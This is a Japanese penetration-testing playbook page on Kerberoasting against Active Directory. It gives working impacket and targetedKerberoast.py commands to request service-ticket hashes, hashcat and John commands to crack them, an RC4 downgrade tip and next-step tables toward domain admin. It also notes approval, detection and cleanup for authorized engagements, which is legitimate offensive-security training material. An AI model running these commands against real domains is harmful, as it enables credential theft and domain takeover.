# Kerberoasting

> **スコープ**: SPN（Service Principal Name）が設定されたドメインアカウントへの TGS 要求とハッシュのオフラインクラック。標準 Kerberoasting（Impacket / nxc）〜Targeted Kerberoasting（GenericWrite 権限を使った SPN 付与）まで扱う。ハッシュクラックの詳細は `../../05_Tools_Reference/Hashcat.md` を参照。

## 着火条件

- ドメインへの認証情報がある（任意の低権限ユーザーで可）
- SPN が設定されたユーザーアカウントが存在する
- または、GenericWrite 権限で SPN を任意のアカウントに設定できる（Targeted Kerberoasting）

## 環境前提
- 実行環境: テスター端末
- 必要なツール: `impacket-GetUserSPNs`（ペネトレ用 Linux ディストリ標準搭載）/ `netexec`（同左）/ `targetedKerberoast.py`（Targeted 版。GitHub より別途取得要）/ `hashcat` / `john`（いずれも標準搭載）
- 外部リソース依存: targetedKerberoast.py はインターネットアクセス要。オフライン環境では事前取得

## 先に確認すること

- **Kerberoasting を思いつく流れ**: 認証情報が取れたら（どんな低権限でも）まず `GetUserSPNs` を実行して SPN 付きアカウントを確認する
- **Administrator に SPN が設定されているケース**: クラックに成功すれば直接 DA。最優先で対処する

**攻撃者の思考トレース:** SPN が付いたサービスアカウント（`SVC_TGS` / `SVC_SQL` / `SVC_WEB` 等）は弱いパスワードが設定されていることが多く、クラック成功率が高い。名前だけで判断せず必ず `GetUserSPNs` で実際に確認する。

---

## 1. SPN 付きアカウントの確認とハッシュ取得（Impacket）

**コマンド:**

```bash
# [Attacker] SPN 付きアカウントの確認とハッシュ取得を同時に実行
impacket-GetUserSPNs \
  '[DOMAIN]/[USER]:[PASSWORD]' \
  -dc-ip [DC_IP] \
  -request \
  -outputfile kerberoast_hashes.txt
```

**観測される出力 → 次のアクション:**

| 出力 | 示唆 | 次のアクション |
|---|---|---|
| `$krb5tgs$23$...` ハッシュが出力される | 標準 Kerberoasting 成立 | §3 ハッシュクラックへ |
| `No entries found!` | SPN 付きアカウントが存在しない | §2 Targeted Kerberoasting を検討 |
| `Administrator` のハッシュが取れる | 最高優先度 | §3 で最優先クラック |

---

## 2. Targeted Kerberoasting（GenericWrite 権限を使用）

**着火条件:** GenericWrite 権限で任意のアカウントに SPN を設定できる（`../ACE_Abuse/GenericWrite.md` で確認）。

**コマンド:**

```bash
# [Attacker] SPN の付与・ハッシュ取得・SPN のクリーンアップを自動で行う
python3 targetedKerberoast.py -v \
  -d '[DOMAIN]' \
  -u '[USER]' \
  -p '[PASSWORD]' \
  --dc-ip [DC_IP] \
  -o targeted_hashes.txt
```

**観測される出力 → 次のアクション:**

| 出力 | 示唆 | 次のアクション |
|---|---|---|
| ハッシュが `targeted_hashes.txt` に出力される | Targeted Kerberoasting 成立 | §3 ハッシュクラックへ |

**注意:** targetedKerberoast.py はツールが自動で SPN の付与・取得・クリーンアップを行う。手動で SPN を付与した場合は必ず除去する（原状回復）。

---

## 3. ハッシュのクラック

**コマンド:**

```bash
# [Attacker] hashcat（GPU が使える場合・高速クラック重視）
# -m 13100 は Kerberos TGS-REP etype 23 (RC4)
hashcat -m 13100 kerberoast_hashes.txt /usr/share/wordlists/rockyou.txt

# ルールファイルを使った強化
hashcat -m 13100 kerberoast_hashes.txt /usr/share/wordlists/rockyou.txt \
  -r /usr/share/hashcat/rules/best64.rule

# AES 暗号化の場合（etype 18）
hashcat -m 19700 kerberoast_hashes.txt /usr/share/wordlists/rockyou.txt

# [Attacker] John the Ripper（GPU なし・CPU のみの場合）
john --wordlist=/usr/share/wordlists/rockyou.txt kerberoast_hashes.txt
john --show kerberoast_hashes.txt
```

**使い分け:**

| 状況 | 推奨 |
|------|------|
| GPU が使える（高速クラック重視）| hashcat |
| GPU なし・CPU のみ | John the Ripper（CPU 最適化されている）|

**観測される出力 → 次のアクション:**

| 出力 | 示唆 | 次のアクション |
|---|---|---|
| パスワードがクラックされる | 認証情報取得 | 取得したパスワードで WinRM / SMB / MSSQL 等で接続 / 使い回し確認 → `../../02_Initial_Access/Credential_Discovery.md` |
| クラック失敗 | パスワードが強力 | 別の攻撃手法に切り替える |

> 詳細 → `../../05_Tools_Reference/Hashcat.md`

---

## 刺さらなかったとき（全体）

| 状況 | 推定原因 | 代替手段 |
|---|---|---|
| `No entries found!` | SPN 付きアカウントが存在しない | §2 Targeted Kerberoasting を検討（GenericWrite 権限が必要）|
| AES ハッシュ（etype 17/18）でクラック失敗 | RC4 より解析が困難 | `--rc4-support` オプションで RC4 ダウングレードを試みる |
| パスワードが強力でクラックできない | 強力なパスワードポリシー | 別の攻撃手法（ASREPRoasting / GenericAll / LAPS）へ |

---

## 注意点・落とし穴

- `No entries found!` の場合は SPN 付きアカウントが存在しない → Targeted Kerberoasting を検討
- AES 暗号化（etype 17/18）は RC4（etype 23）より解析が困難
- Targeted Kerberoasting で手動で SPN を付与した場合は必ず除去する（targetedKerberoast.py は自動クリーンアップ済み）

---

## 本番での前提

- **事前合意の要否**: ★（技術的判断のみ。任意の認証済みユーザーが実行できる仕様）/ ★★★（Targeted Kerberoasting で SPN を付与する場合は書面承認必須）
- **想定されるSIEM/EDR検知**: Event ID 4769（Kerberos サービスチケット要求）/ Defender for Identity の Kerberoasting 検知アラート
- **業務影響リスク**: なし（読み取りのみ）/ Targeted で SPN を付与する場合は属性変更
- **原状回復必須項目**: ✅ Targeted Kerberoasting で手動付与した SPN の除去（targetedKerberoast.py は自動）/ ✅ 取得したハッシュ・クラックしたパスワードは暗号化保管 → テスト完了時破棄
- **演習環境での扱い**: 制約なし（HTB / OSCP 等は本セクション全項目をスキップしてよい）

---

## 関連技術

- 関連：SPN を付与して Targeted Kerberoasting → `../ACE_Abuse/GenericWrite.md`
- 後：ハッシュのクラック → `../../05_Tools_Reference/Hashcat.md`
- 後：クラックしたパスワードで使い回し確認 → `../../02_Initial_Access/Credential_Discovery.md`
